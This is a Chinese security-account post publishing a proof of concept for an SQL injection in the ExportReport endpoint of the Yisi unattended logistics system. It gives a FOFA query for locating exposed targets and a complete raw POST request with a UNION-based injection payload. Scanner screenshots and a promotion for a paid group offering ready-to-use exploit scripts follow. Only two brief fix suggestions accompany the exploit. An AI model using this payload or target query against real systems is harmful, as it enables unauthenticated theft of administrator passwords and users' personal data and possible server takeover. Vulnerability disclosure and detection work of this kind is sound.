#  易思智能物流无人值守系统 ExportReport SQL注入漏洞   
Superhero  nday POC   2024-11-20 02:17  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
易思无人值守智能物流系统只是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇，该系统旨在为流程生产企业提供原料采购、产成品销售及厂内物流的统一管控智能信息化平台，通过全企业产供销业务的集成管理，实现无人值守计量、降本增效、机器替代人工，优化物流资源管控体系。  
  
  
**01******  
  
**漏洞概述**  
  
  
易思智能物流无人值守系统 ExportReport SQL注入漏洞，未经身份验证的远程攻击者除了可  
以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:   
  
body="/api/SingleLogin"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIft3hvROxGJgWGyCYrWkSnFHJ6yu1ZNkEqGXAjYzcj2z6Fia0RgPhicJ15CFOniaHn7Wa8mOYk6woicA/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /Sys_ReportFile/ExportReport HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

rep_Ids=1%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C@@VERSION%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+CdNX
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJS7UWPjDeP7ROdo5LP5O42XcdlRkqFovx5t8NmXziaXKQXkC3fsMMdoXKVE3fdR1VkJlzkuKcF0ug/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJS7UWPjDeP7ROdo5LP5O42KZyT4cZibsrNvKMAWXb3FGeXm366VjttanUibebu2L43GPcVuwlCQz9A/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJS7UWPjDeP7ROdo5LP5O42mQga09YXRyibKRFIFh5XhfiaP9ibReGL3t5ia80bXfwnvuticXzcHZ6QKibg/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJS7UWPjDeP7ROdo5LP5O42wicibia5jKsBKVeF5ByZSzZQEjbljmKZ606M1HY7ajwbLY6avputhQEGw/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJS7UWPjDeP7ROdo5LP5O42ARQxXIg5ER9vgwwYfiaoMq2vcVmQ3PMsiaibdICRxZQNhE9PfgtwOhPSg/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。   
  
2、三款工具都支持内置poc+自写poc目录一起扫描。   
  
3、保持每周更新10-15个poc。   
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
